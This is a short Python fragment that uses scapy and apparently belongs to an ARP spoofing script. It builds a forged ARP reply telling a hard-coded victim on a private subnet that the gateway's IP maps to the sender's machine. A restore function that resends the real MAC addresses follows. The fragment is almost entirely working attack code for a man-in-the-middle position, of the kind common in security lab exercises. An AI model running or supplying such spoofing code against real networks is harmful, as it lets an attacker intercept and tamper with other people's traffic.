packet = scapy.ARP(op=2,pdst="192.168.138.145", hwdst='00:0c:29:81:44:25', psrc="192.168.138.2") # op=2 makes packet a response and not a request



#restore ARP table
def restore(dst_ip, src_ip):
	dst_mac = scan_one(dst_ip)
	src_mac = scan_one(src_ip)
	packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
	scapy.send(packet, count=4, verbose=False)